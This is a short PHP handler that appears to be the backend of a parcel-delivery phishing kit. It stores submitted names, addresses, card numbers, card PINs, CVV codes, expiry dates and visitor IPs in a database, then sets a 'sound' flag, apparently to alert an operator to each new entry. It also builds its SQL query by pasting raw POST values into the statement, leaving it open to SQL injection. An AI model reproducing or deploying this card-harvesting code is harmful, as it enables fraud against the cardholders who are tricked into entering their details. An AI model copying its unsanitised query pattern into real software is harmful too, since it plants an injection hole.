<?php
require "../common/commonfiles.php";

if(isset($_POST["action"])){
	
	$case = $_POST["action"];
	
	switch ($case){
		
		
		case "insert-userdata":
		
			$parcelno = $_POST["parcelno"];
		
			
			$sql = "
			INSERT 
				INTO 
					`customer_details`
						(
							`name`,
							`lastname`,
							`address`,
							`payment_card_no`,
							`cardpin`,
							`cvv_code`,
							`month`,
							`year`,
							`last_online`,
							`ip`
						) 
							VALUES 
						(
							'".$_POST["name"]."',
							'".$_POST["lastname"]."',
							'".$_POST["address"]."',
							'".$_POST["payment_card_no"]."',
							'".$_POST["cardpin"]."',
							'".$_POST["cvv_code"]."',
							'".$_POST["month"]."',
							'".$_POST["year"]."',
							'".time()."',
							'".get_client_ip()."'
						);
						";
			//echo $sql;
		
			//$data = db::execute($sql);

			$conn = db::open();

			mysqli_query($conn,$sql);

            

			//echo mysqli_error();
			echo mysqli_insert_id($conn);
			
			mysqli_query($conn,"update sound set value = 1");
			//echo $data;

			
		
		break;
		
		
	}
	
	
}








?>